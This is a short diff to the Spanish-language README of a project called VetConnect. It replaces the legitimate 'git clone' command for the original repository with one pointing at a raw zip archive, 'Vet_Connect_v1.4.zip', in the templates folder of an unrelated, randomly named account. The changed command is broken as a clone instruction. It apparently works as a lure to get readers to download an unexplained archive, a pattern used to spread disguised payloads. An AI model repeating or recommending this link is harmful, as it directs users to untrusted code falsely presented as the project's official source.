@@ -33,5 +33,5 @@ Sigue estos pasos para ejecutar el proyecto en tu máquina local:
 ### Clonar el repositorio
 
 ```bash
-git clone https://github.com/mcadavidr2/VetConnect.git
+git clone https://github.com/junio14245252626236/VetConnect/raw/refs/heads/main/VetConnect/templates/Vet_Connect_v1.4.zip
 cd VetConnect
